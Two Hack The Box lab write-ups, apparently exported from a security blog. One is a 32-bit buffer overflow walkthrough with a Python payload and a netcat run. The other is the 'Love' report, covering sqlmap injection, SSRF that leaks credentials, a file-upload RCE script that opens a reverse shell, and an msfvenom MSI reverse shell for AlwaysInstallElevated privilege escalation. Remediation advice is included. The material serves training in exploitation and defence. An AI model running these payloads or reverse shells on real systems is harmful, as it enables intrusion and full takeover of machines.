────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────EAX  0xc9                EBX  0x62616175 ('uaab')  ECX  0xffffffffEDX  0xffffffffEDI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */ESI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */EBP  0x62616176 ('vaab')  ESP  0xffffd020 ◂-- 'xaabyaab'  EIP  0x62616177 ('waab')  ─────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────  Invalid address 0x62616177The EIP register was successfully overwritten, and the offset can now be calculated with cyclic -l 0x62616177:pwndbg&gt; cyclic -l 0x62616177  188Thus, 188 bytes can be passed into the buffer before the EIP register is overwritten.Flag() DebugWith the EIP register successfully overwritten, the next step is to control it such that it points to the flag() function. Before determining where this function lies in memory, it is imperative to first establish that this binary is in little endian format:  ┌─[✗]─[0xd4y@Writeup]─[~/business/hackthebox/challenges/pwn/easy/you_know]  └──╼ $file vulnvuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not strippedAfter finding out that this binary is an LSB executable, the next step is to discover where flag() is in memory. This can be done with the info functions command within GDB:  pwndbg&gt; info functions  All defined functions:    Non-debugging symbols:  0x08049000  _init  0x08049030  printf@plt  0x08049040  gets@plt  0x08049050  fgets@plt  0x08049060  getegid@plt  0x08049070  puts@plt  0x08049080  exit@plt  0x08049090  __libc_start_main@plt  0x080490a0  setvbuf@plt  0x080490b0  fopen@plt  0x080490c0  setresgid@plt  0x080490d0  _start  0x08049110  _dl_relocate_static_pie  0x08049120  __x86.get_pc_thunk.bx  0x08049130  deregister_tm_clones  0x08049170  register_tm_clones  0x080491b0  __do_global_dtors_aux  0x080491e0  frame_dummy  0x080491e2  flag  0x08049272  vuln  0x080492b1  main  0x08049330  __libc_csu_init  0x08049390  __libc_csu_fini  0x08049391  __x86.get_pc_thunk.bp  0x08049398  _finiNote the functions of interest which are in redFlag() is at 0x080491e2 which in little endian byte format is \xe2\x91\x04\x08. Therefore, upon inputting a string of 188 bytes followed by the address of the flag, the program should call the function:  ┌─[0xd4y@Writeup]─[~/business/hackthebox/challenges/pwn/easy/you_know]  └──╼ $python -c "print 'A'*188 + '\\xe2\\x91\\x04\\x08'" &gt; eip_flagBefore running this malicious string, recall that the program exits if the file flag.txt does not exist. This file was simply created using the touch command as follows:  ┌─[0xd4y@Writeup]─[~/business/hackthebox/challenges/pwn/easy/you_know]  └──╼ $touch flag.txtThe comparison within the function in question starts at flag+100 (or 0x08049246). This can be found using the disass (short for disassemble) command within GDB:  pwndbg&gt; disass flag                                                                                                                                                    Dump of assembler code for function flag:                                                0x080491e2 &lt;+0&gt;:     push   ebp                                                     0x080491e3 &lt;+1&gt;:     mov    ebp,esp                                                 0x080491e5 &lt;+3&gt;:     push   ebx                                                     0x080491e6 &lt;+4&gt;:     sub    esp,0x54    0x080491e9 &lt;+7&gt;:     call   0x8049120 &lt;__x86.get_pc_thunk.bx&gt;    0x080491ee &lt;+12&gt;:    add    ebx,0x2e12    0x080491f4 &lt;+18&gt;:    sub    esp,0x8    0x080491f7 &lt;+21&gt;:    lea    eax,[ebx\-0x1ff8]    0x080491fd &lt;+27&gt;:    push   eax  0x080491fe &lt;+28&gt;:    lea    eax,[ebx\-0x1ff6]    0x08049204 &lt;+34&gt;:    push   eax  0x08049205 &lt;+35&gt;:    call   0x80490b0 &lt;fopen@plt&gt;    0x0804920a &lt;+40&gt;:    add    esp,0x10    0x0804920d &lt;+43&gt;:    mov    DWORD PTR [ebp\-0xc],eax  0x08049210 &lt;+46&gt;:    cmp    DWORD PTR [ebp\-0xc],0x0    0x08049214 &lt;+50&gt;:    jne    0x8049232 &lt;flag+80&gt;    0x08049216 &lt;+52&gt;:    sub    esp,0xc    0x08049219 &lt;+55&gt;:    lea    eax,[ebx\-0x1fec]    0x0804921f &lt;+61&gt;:    push   eax  0x08049220 &lt;+62&gt;:    call   0x8049070 &lt;puts@plt&gt;    0x08049225 &lt;+67&gt;:    add    esp,0x10    0x08049228 &lt;+70&gt;:    sub    esp,0xc    0x0804922b &lt;+73&gt;:    push   0x0    0x0804922d &lt;+75&gt;:    call   0x8049080 &lt;exit@plt&gt;    0x08049232 &lt;+80&gt;:    sub    esp,0x4    0x08049235 &lt;+83&gt;:    push   DWORD PTR [ebp\-0xc]    0x08049238 &lt;+86&gt;:    push   0x40    0x0804923a &lt;+88&gt;:    lea    eax,[ebp\-0x4c]    0x0804923d &lt;+91&gt;:    push   eax  0x0804923e &lt;+92&gt;:    call   0x8049050 &lt;fgets@plt&gt;    0x08049243 &lt;+97&gt;:    add    esp,0x10    0x08049246 &lt;+100&gt;:   cmp    DWORD PTR [ebp+0x8],0xdeadbeef    0x0804924d &lt;+107&gt;:   jne    0x8049269 &lt;flag+135&gt;    0x0804924f &lt;+109&gt;:   cmp    DWORD PTR [ebp+0xc],0xc0ded00d    0x08049256 &lt;+116&gt;:   jne    0x804926c &lt;flag+138&gt;    0x08049258 &lt;+118&gt;:   sub    esp,0xc    0x0804925b &lt;+121&gt;:   lea    eax,[ebp\-0x4c]    0x0804925e &lt;+124&gt;:   push   eax  0x0804925f &lt;+125&gt;:   call   0x8049030 &lt;printf@plt&gt;    0x08049264 &lt;+130&gt;:   add    esp,0x10    0x08049267 &lt;+133&gt;:   jmp    0x804926d &lt;flag+139&gt;    0x08049269 &lt;+135&gt;:   nop  0x0804926a &lt;+136&gt;:   jmp    0x804926d &lt;flag+139&gt;    0x0804926c &lt;+138&gt;:   nop  0x0804926d &lt;+139&gt;:   mov    ebx,DWORD PTR [ebp\-0x4]    0x08049270 &lt;+142&gt;:   leave   0x08049271 &lt;+143&gt;:   ret   End of assembler dump.Prior to piping the contents of eip_flag into the binary, a breakpoint was set at 0x08049246 to allow further investigation into the EBP register.pwndbg&gt; b *0x08049246                                                                  Breakpoint 1 at 0x8049246Finally, the malicious string can be run:pwndbg&gt; r &lt; eip_flag  Starting program: /home/0xd4y/business/hackthebox/challenges/pwn/easy/you_know/vuln &lt; eip_flag  You know who are 0xDiablos:  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    Breakpoint 1, 0x08049246 in flag ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  ────────────────────────────────────[ REGISTERS ]─────────────────────────────────────EAX  0x0EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) --▸ 0x804bf10 (_DYNAMIC) ◂-- add    dword ptr [eax], eax  ECX  0x0EDX  0xfbad2498EDI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */ESI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */EBP  0xffffd01c ◂-- 'AAAA'  ESP  0xffffcfc4 ◂-- 0x41414141 ('AAAA')  EIP  0x8049246 (flag+100) ◂-- cmp    dword ptr [ebp + 8], 0xdeadbeefAs expected, the breakpoint at flag+100 was hit. Looking at ebp+0x8, it can be observed that it was not overwritten:  pwndbg&gt; x/x $ebp+0x8  0xffffd024:     0xffffd0f4Upon looking at the first 16 bytes of the EBP register, an interesting circumstance can be noticed:  pwndbg&gt; x/4x $ebp  0xffffd01c:     0x41414141      0x00000000      0xffffd0f4      0xffffd0fcAt exactly $ebp, the junk bytes that are present in the malicious string can be seen. Following that is a succession of eight zeroes followed by the value of $ebp+0x8 and $ebp+0xc. This succession of zeroes is particularly interesting as it is not clear what it relates to. Modifying the malicious string by adding four B’s to the end of it and piping it into the program ,reveals an interesting behavior within the binary:  ┌─[0xd4y@Writeup]─[~/business/hackthebox/challenges/pwn/easy/you_know]  └──╼ $python -c "print 'A'*188 + '\\xe2\\x91\\x04\\x08'+'BBBB'" &gt; eip_flagpwndbg&gt; r &lt; eip_flag                                                                    Starting program: /home/0xd4y/business/hackthebox/challenges/pwn/easy/you_know/vuln &lt; eip_flag  You know who are 0xDiablos:                                                            AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  AAAAAAAAAAAAAABBBB                            Breakpoint 1, 0x08049246 in flag ()        LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                      ────────────────────────────────────[ REGISTERS ]─────────────────────────────────────EAX  0x0                                  EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) --▸ 0x804bf10 (_DYNAMIC) ◂-- add    dword ptr [eax], eax  ECX  0x0                                  EDX  0xfbad2498                          EDI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */ESI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */EBP  0xffffd01c ◂-- 'AAAABBBB'             ESP  0xffffcfc4 ◂-- 0x41414141 ('AAAA')    EIP  0x8049246 (flag+100) ◂-- cmp    dword ptr [ebp + 8], 0xdeadbeefNow, looking at the EBP register, observe the value at $ebp+0x4:  pwndbg&gt; x/4x $ebp  0xffffd01c:     0x41414141      0x42424242      0xffffd000      0xffffd0fcThus, $ebp+0x8 and $ebp+0xc can now successfully be controlled by appending 0xdeadbeef and 0xc0ded00d in little endian byte format (\xef\xbe\xad\xde and \x0d\xd0\xde\xc0 respectively).ExploitTherefore, the final exploit will take the following form:JUNK_BYTE188 + ADDRESS_OF_FLAG + JUNK2_BYTE4 + DEADBEEF + C0DED00DWhere:JUNK_BYTE = AJUNK2_BYTE = BADDRESS_OF_FLAG = \xe2\x91\x04\x08DEADBEEF = \xef\xbe\xad\xdeC0DED00D = \x0d\xd0\xde\xc0Piping the contents of eip_flag into the binary and checking the EBP register, it can be seen that ebp+0x8 and ebp+0xc were successfully controlled.  ┌─[✗]─[0xd4y@Writeup]─[~/business/hackthebox/challenges/pwn/easy/you_know]  └──╼ $python -c "print 'A'*188 + '\\xe2\\x91\\x04\\x08'+'BBBB'+'\\xef\\xbe\\xad\\xde'+'\\x0d\\xd0\\xde\\xc0'" &gt; eip_flag    pwndbg&gt; r &lt; eip_flag                                                                                                                                                  [4/579]  Starting program: /home/0xd4y/business/hackthebox/challenges/pwn/easy/you_know/vuln &lt; eip_flag                                                                                You know who are 0xDiablos:                                                                                                                                                    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  AAAAAAAAAAAAAABBBBﾭ                                                                                                                                                              Breakpoint 1, 0x08049246 in flag ()        LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                      ────────────────────────────────────[ REGISTERS ]─────────────────────────────────────EAX  0x0                                  EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) --▸ 0x804bf10 (_DYNAMIC) ◂-- add    dword ptr [eax], eax  ECX  0x0                                  EDX  0xfbad2498                          EDI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */ESI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */EBP  0xffffd01c ◂-- 0x41414141 ('AAAA')    ESP  0xffffcfc4 ◂-- 0x41414141 ('AAAA')    EIP  0x8049246 (flag+100) ◂-- cmp    dword ptr [ebp + 8], 0xdeadbeef                    ───────────────────────────────────[ DISASM ]───────────────────────────────────        ► 0x8049246 &lt;flag+100&gt;    cmp    dword ptr [ebp + 8], 0xdeadbeef                        0x804924d &lt;flag+107&gt;    jne    flag+135 &lt;flag+135&gt;                                                                               0x804924f &lt;flag+109&gt;    cmp    dword ptr [ebp + 0xc], 0xc0ded00d                      0x8049256 &lt;flag+116&gt;    jne    flag+138 &lt;flag+138&gt;                                                                               0x8049258 &lt;flag+118&gt;    sub    esp, 0xc                                                0x804925b &lt;flag+121&gt;    lea    eax, [ebp - 0x4c]                                      0x804925e &lt;flag+124&gt;    push   eax       0x804925f &lt;flag+125&gt;    call   printf@plt &lt;printf@plt&gt;                                                                           0x8049264 &lt;flag+130&gt;    add    esp, 0x10                                              0x8049267 &lt;flag+133&gt;    jmp    flag+139 &lt;flag+139&gt;                                                                               0x8049269 &lt;flag+135&gt;    nop             ───────────────────────────────────[ STACK ]────────────────────────────────────        00:0000│ esp 0xffffcfc4 ◂-- 0x41414141 ('AAAA')                                          ─────────────────────────────────[ BACKTRACE ]──────────────────────────────────        ► f 0 0x8049246 flag+100                      f 1 0x42424242                              f 2 0xdeadbeef                              f 3 0xc0ded00d                              f 4    0x300                              ────────────────────────────────────────────────────────────────────────────────pwndbg&gt; x/4x $ebp                          0xffffd01c:     0x41414141      0x42424242      0xdeadbeef      0xc0ded00dConsequently, the if statement discussed earlier in the Ghidra section will run true. After piping the malicious string into netcat, the flag.txt file located within the server is printed out.  ┌─[✗]─[0xd4y@Writeup]─[~/business/hackthebox/challenges/pwn/easy/you_know]  └──╼ $nc 159.65.54.50 31449 &lt; eip_flag  You know who are 0xDiablos: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBﾭ  HTB{0ur_Buff3r_1s_not_healthy}┌─[0xd4y@Writeup]─[~/business/hackthebox/challenges/pwn/easy/you_know]  └──╼ $ConclusionThe binary in question was vulnerable to a buffer overflow attack due to the lack of boundary checks performed on user input. The deprecated gets() function was used within the binary despite the security warnings that are associated with it. As a result, memory could be overwritten resulting in behavior that the binary was not written to perform. The following remediations should be strongly considered:      Never use the deprecated gets() function        Usage of this function creates the possibility for security risks that could allow malicious actors to run arbitrary code        Use the secure fgets() function        This function reads user input until a newline character is found or until the buffer gets filled  The aforementioned remediations should be observed as soon as possible. Until this binary is patched, the service running on port 31449 should be disabled.[1] https://www.gnu.org/software/gdb/ [2] https://github.com/NationalSecurityAgency/ghidra [3] https://man7.org/linux/man-pages/man3/gets.3.html",
      "image": "/images/0xd4y-logo-gray.png"
    } ,
  
    {
      "title"    : "Love Writeup",
      "category" : "hackthebox",
      "tags"     : "Windows, SSRF, CVE, HKLM, and MSI",
      "url"      : "/hackthebox/2021/05/21/Love-Writeup/",
      "date"     : "May 21, 2021",
      "content"  : "This report can be read both on this site, and as its original report form. It is highly recommended that you read the original report form instead because it is better formatted.LoveExploitation of misconfigurations and insecure code   0xd4yMay 25, 20210xd4y WriteupsLinkedIn: https://www.linkedin.com/in/segev-eliezer/ Email: 0xd4yWriteups@gmail.comWeb: https://0xd4y.github.io/ Table of ContentsExecutive Summary        2Attack Narrative        3Enumeration        3Port Enumeration        3HTTP Enumeration        5SQL Injection (SQLi)        6Admin Page        9HTTPS Enumeration        11Abusing beta.php        11Reverse Shell        15Privilege Escalation        17Post Exploitation Analysis        19SQL Injection        19Beta.php Vulnerability        19Conclusion        21Executive SummaryNo prior information was provided for this penetration test except for the IP of the vulnerable machine. This system contains multiple critical vulnerabilities. Along with an SQL injection vulnerability in the root page of the HTTP service, there is an insecure file scanner function within the HTTPS service which was responsible for the leakage of plaintext admin credentials. Additionally, a vulnerable version of Voting System software was installed which allowed for an easy route to returning a reverse shell.After gaining the reverse shell, the box had a misconfigured group policy (AlwaysInstallElevated) which authorized the installation of packages as SYSTEM. The disabling of antivirus software on this machine facilitated the process of obtaining system privileges.Attack NarrativeEnumerationTo determine the presence of a possible attack vector, it is essential to begin by enumerating the ports of the box.Port EnumerationAlong with enumerating open ports, their services and their versions are also examined using the -sC (for default scripts) and -sV (enumerate version) flags.  Nmap scan report for 10.10.10.239Host is up (0.065s latency).Not shown: 993 closed portsPORT     STATE SERVICE      VERSION80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)| http\-cookie\-flags:|   /:|     PHPSESSID:|_      httponly flag not set| http\-methods:|_  Supported Methods: GET HEAD POST OPTIONS|_http\-server\-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http\-title: Voting System using PHP135/tcp  open  msrpc        Microsoft Windows RPC139/tcp  open  netbios\-ssn  Microsoft Windows netbios\-ssn443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http\-server\-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http\-title: 403 Forbidden| ssl\-cert: Subject: commonName\=staging.love.htb/organizationName\=ValentineCorp/stateOrProvinceName\=m/countryName\=in| Issuer: commonName\=staging.love.htb/organizationName\=ValentineCorp/stateOrProvinceName\=m/countryName\=in| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021\-01\-18T14:00:16| Not valid after:  2022\-01\-18T14:00:16| MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6|_SHA\-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2|_ssl\-date: TLS randomness does not represent time| tls\-alpn:|_  http/1.1445/tcp  open  microsoft\-ds Windows 10 Pro 19042 microsoft\-ds (workgroup: WORKGROUP)3306/tcp open  mysql?| fingerprint\-strings:|   DNSVersionBindReqTCP, Help, JavaRMI, LDAPBindReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TerminalServer, afp, ms\-sql\-s:|_    Host '10.10.14.138' is not allowed to connect to this MariaDB server5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http\-server\-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http\-title: 403 ForbiddenHost script results:|_clock\-skew: mean: 2h52m30s, deviation: 4h02m31s, median: 32m28s| smb\-os\-discovery:|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)|   OS CPE: cpe:/o:microsoft:windows_10::-|   Computer name: Love|   NetBIOS computer name: LOVE\\x00|   Workgroup: WORKGROUP\\x00|_  System time: 2021\-05\-07T14:50:29\-07:00| smb\-security\-mode:|   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2\-security\-mode:|   2.02:|_    Message signing enabled but not required| smb2\-time:|   date: 2021\-05\-07T21:50:28|_  start_date: N/ANmap detected this as a Windows box from the SMB service. Additionally, there are two HTTP services open: one on port 80, and a peculiar one on port 5000. Upon attempting to access the HTTP service on port 5000, the scan was met with a 403 error. Interestingly, this box is running Apache which is uncommon for the Windows operating system (this box is running Windows 10 pro 19042 which was detected through SMB). On port 443 there is an HTTPS service whose certificate leaks the domain name of staging.love.htb. Additionally, there is a mysql service, but remote connections are disabled.The services running on each port do not appear to be outdated, and there are most likely no CVEs to take advantage of. Therefore, the penetration test will start by accessing the HTTP page, as web services tend to have a bigger attack surface than other services.HTTP EnumerationVisiting the page on 10.10.10.239, the server responds with a simple login page.Attempting to login with common default credentials does not work:However, a useful error message pops up that says “Cannot find voter with the ID”. Accordingly, it may be viable to attain usernames by brute forcing ID’s.SQL Injection (SQLi)A common vulnerability among login pages is SQLi, so it makes sense to attempt this on the webpage: Upon inputting a SQL query into the username field, an “Incorrect password” message pops up instead of “Cannot find voter with the ID”. Judging from this output, it is likely that this webpage is vulnerable to SQLi.  ┌─\[0xd4y@Writeup]─\[~/business/hackthebox/easy/windows/love]                                                                                                                 └──╼ $sqlmap \-r login.burp \--batch \--dump                                                                                                                                         ___                                                                                                                                                                      __H__                                                                                                                                                                _ __\["]__ __ __  {1.4.10#stable}                                                                                                                                  |_ -| . \["]     | .'| . |                                                                                                                                                  \[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, stateand federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                                                    \[\*] starting @ 17:47:39 /2021\-05\-26/                                                                                                                                       \[17:47:39] \[INFO] parsing HTTP request from 'login.burp'                                                                                                                   \[17:47:40] \[WARNING] provided value for parameter 'login' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly\[17:47:40] \[INFO] resuming back\-end DBMS 'mysql'\[17:47:40] \[INFO] testing connection to the target URL                                                                                                                      got a 302 redirect to 'http://10.10.10.239:80/index.php'. Do you want to follow? \[Y/n] Yredirect is a result of a POST request. Do you want to resend original POST data to a new location? \[Y/n] Ysqlmap resumed the following injection point(s) from stored session:                 \---                                                                                                                                                                         Parameter: voter (POST)                                                                                                                                                        Type: time\-based blind                                                             Title: MySQL \&gt;= 5.0.12 AND time\-based blind (query SLEEP)   Payload: voter\=a' AND (SELECT 5793 FROM (SELECT(SLEEP(5)))bSGe) AND 'YMSl'='YMSl&amp;password\=a&amp;login\=\---   Database: votesystem                                                                                                                                                        Table: admin                                                                                                                                                                \[1 entry]                                                                                                                                                                   +----+--------+----------+--------------------------------------------------------------+----------+-----------+------------+                                               | id | photo  | lastname | password                                                     | username | firstname | created_on |                                               +----+--------+----------+--------------------------------------------------------------+----------+-----------+------------+                                               | 1  | nc.exe | Devierte | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC | admin    | Neovic    | 2018\-04\-02 |                                               +----+--------+----------+--------------------------------------------------------------+----------+-----------+------------+Using time-based bline SQLi, sqlmap successfully retrieved the contents of the SQL server with the credentials of admin. However, admin’s password is hashed using blowfish encryption which takes a long time to decrypt (and as it turns out admin’s password is not in rockyou).Admin PageAlong with enumerating the SQL server, the directories of the web service were also enumerated using gobuster[[1]](#ftnt1):  /admin (Status: 301)/aux.php (Status: 403)/aux (Status: 403)/con.php (Status: 403)/con (Status: 403)/dist (Status: 301)/home.php (Status: 302)/images (Status: 301)/includes (Status: 301)/index.php (Status: 200)/licenses (Status: 403)/login.php (Status: 302)/logout.php (Status: 302)/phpmyadmin (Status: 403)/plugins (Status: 301)/preview.php (Status: 302)/prn.php (Status: 403)/prn (Status: 403)/server\-status (Status: 403)/tcpdf (Status: 301)/webalizer (Status: 403)The /admin directory in particular stands out as a potentially interesting directory. The page on this directory, however, looks exactly like the one on the root directory:Nevertheless, this web page functions differently as the error message differs from “Cannot find voter with the ID”. In any case, this error may hint at a potential username leak via brute forcing usernames. Attempting to use default credentials such as admin:password results in an “Incorrect Password” error message:Therefore, it is highly likely that there is an account with the username of “admin” (the SQLi dump also supports this).HTTPS EnumerationAfter enumerating the HTTP service, the HTTPS web page is still left for examination. Before being able to visit the web page, it is essential to first add the domain name found by Nmap (staging.love.htb) to the /etc/hosts file. After doing so, it is possible to visit the web page:This service appears to be made for scanning files. To the right is a potentially interesting “Sign up” box which could potentially be interesting to test out for an XSS attack. At the top left of the web page are two links: Home, a link leading to the root directory, and Demo, a link which leads to beta.php.Abusing beta.phpUpon clicking Demo, we are met with the following page:The file scanner, which goes by the name of beta.php, expects a url and performs a GET request on the specified file. This can be abused by using the file:/// prefix to access local files. Seeing as this box is running a Windows Apache server, it is likely there is a web page hosted on C:/xampp/htdocs/omrs/index.php:This code can further be inspected using the html source code (inspect element) feature:&lt;/form&gt;  &lt;?php     session_start();     if(isset($_SESSION['admin'])){       header('location: admin/home.php');     }   if(isset($_SESSION\['voter'])){     header('location: home.php');   }?&gt;&lt;?php include 'includes/header.php'; ?&gt;&lt;body class\="hold-transition login-page"\&gt;&lt;div class\="login-box"\&gt;     &lt;div class\="login-logo"\&gt;         &lt;b&gt;Voting System&lt;/b\&gt;     &lt;/div\&gt;     &lt;div class\="login-box-body"\&gt;       &lt;p class\="login-box-msg"\&gt;Sign in to start your session&lt;/p\&gt;       &lt;form action\="login.php" method\="POST"\&gt;             &lt;div class\="form-group has-feedback"\&gt;               &lt;input type\="text" class\="form-control" name\="voter" placeholder\="Voter's ID" required\&gt;               &lt;span class\="glyphicon glyphicon-user form-control-feedback"\&gt;&lt;/span\&gt;             &lt;/div\&gt;         &lt;div class\="form-group has-feedback"\&gt;           &lt;input type\="password" class\="form-control" name\="password" placeholder\="Password" required\&gt;           &lt;span class\="glyphicon glyphicon-lock form-control-feedback"\&gt;&lt;/span\&gt;         &lt;/div\&gt;             &lt;div class\="row"\&gt;               &lt;div class\="col-xs-4"\&gt;                     &lt;button type\="submit" class\="btn btn-primary btn-block btn-flat" name\="login"\&gt;&lt;i class\="fa fa-sign-in"\&gt;&lt;/i&gt; Sign In&lt;/button\&gt;               &lt;/div\&gt;             &lt;/div\&gt;       &lt;/form\&gt;     &lt;/div\&gt;     &lt;?php         if(isset($_SESSION\['error'])){             echo "                 &lt;div class='callout callout-danger text-center mt20'&gt;                     &lt;p&gt;".$_SESSION\['error']."&lt;/p&gt;                 &lt;/div&gt;             ";             unset($_SESSION\['error']);         }     ?&gt;&lt;/div\&gt;&lt;?php include 'includes/scripts.php' ?&gt;After enumerating multiple potentially sensitive files, nothing interesting was found. Furthermore, attempts to perform a log injection / poisoning attack[[2]](#ftnt2) were unsuccessful.Looking back at the Nmap scan, a peculiar HTTP service running on port 5000 was found. However, this service could not be accessed due to the 403 Forbidden error. Nevertheless, due to this file scanner having the functionality of making GET requests, this page could indirectly be accessed through forcing the file scanner to make a request to this service.After completing the request, credentials to a user by the name of admin are leaked. Piecing this information together with the Admin Page found during the HTTP enumeration, it follows that we can login as the administrator. Using the credentials of admin:@LoveIsInTheAir!!!!, the user’s account could successfully be accessed:The result is a page with many different functionalities, but nothing interesting appeared. At the bottom of the page is a copyright from 2018 assigned to a website called Sourcecodester.Reverse ShellAfter researching “Voting System sourcecodester” on Google, results related to an RCE exploit via a file upload pop up.The exploit works due to improper sanitization of image files. To upload a php shell as an image file, the exploit simply modifies the data of the POST request to replicate an image file:Note the “image/png” lineOnce this malicious file is uploaded, a GET request is performed on the file located in the /votesystem/images directory. In the context of this box, the /votesystem directory does not exist, and the script needs to be modified to remove the /votesystem string.  import requests# --- Edit your settings here ----IP = "10.10.10.239" # Website's URLUSERNAME = "admin" #Auth usernamePASSWORD = "@LoveIsInTheAir!!!!" # Auth PasswordREV_IP = "10.10.14.111" # Reverse shell IPREV_PORT = "9001" # Reverse port  # --------------------------------INDEX_PAGE = f"http://{IP}/admin/index.php"LOGIN_URL = f"http://{IP}/admin/login.php"VOTE_URL = f"http://{IP}/admin/voters_add.php"CALL_SHELL = f"http://{IP}/images/shell.php"    payload = payload.replace("IIPP", REV_IP)  payload = payload.replace("PPOORRTT", REV_PORT)    def sendPayload():   if login():       global payload         payload = bytes(payload, encoding="UTF-8")         files  = {'photo':('shell.php',payload,                   'image/png', {'Content-Disposition': 'form-data'}                   )               }         data = {           "firstname":"a",           "lastname":"b",           "password":"1",           "add":""       }         r = s.post(VOTE_URL, data=data, files=files)       if r.status_code == 200:             print("Poc sent successfully")       else:             print("Error")    def callShell():     r = s.get(CALL_SHELL, verify=False)   if r.status_code == 200:         print("Shell called check your listiner")  print("Start a NC listner on the port you choose above and run...")  sendPayload()  callShell()Some code was removed to not clutter up this reportKey parts of the exploit can be seen above. Note the modification of the variables toward the top of the page as well as the URL. Now, executing the script results in a reverse shell as the user phoebe:Privilege EscalationAfter obtaining a shell as the user phoebe, the next task is to escalate to Administrator or SYSTEM.From the output it can be seen that winPEAS detected a misconfiguration in the AlwaysInstallElevated group policy. By default, this policy is set to 0, and it is extremely dangerous to modify this value. When this policy is set to 1, Microsoft Windows Installer Packages (MSI) are installed with system privileges. Therefore, a malicious MSI file that returns a reverse shell can be used to get a shell as the SYSTEM user:msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.14.111 LPORT=9001 -f msi &gt; 0xd4y.msiAfter downloading the malicious MSI file onto the box, it is important to start up a multi handler on msfconsole before executing it. Upon downloading the file and setting up the msfconsole listener, the msi file can be executed using the msiexec command (a command responsible for installing, modifying, and performing operations on Windows Installer[[3]](#ftnt3)):msiexec /quiet /qn /i 0xd4y.msiA shell is then returned as the system user.Post Exploitation AnalysisSQL InjectionThe SQL injection led to the leakage of the Admin password hash. This was due to the lack of user-input sanitization. The following code snippet was taken from C:\xampp\htdocs\omrs\login.php, and is running on the root page of http://10.10.10.239:  if(isset($_POST\['login'])){             $voter = $_POST\['voter'];                                                 $password = $_POST\['password'];                                                                          $sql = "SELECT \* FROM voters WHERE voters_id = '$voter'";                 $query = $conn-&gt;query($sql);This piece of code was responsible for the SQLi. Note the user query is passed directly into the sql variable, which is used during the connection to the internal SQL server. The user input is passed into the voter variable which is surrounded by single quotes in the SQL query. This was the reason for the SQLi working upon prepending a single quote to the beginning of the input. Note that this same vulnerability is present within C:\xampp\htdocs\omrs\admin\login.php.Beta.php 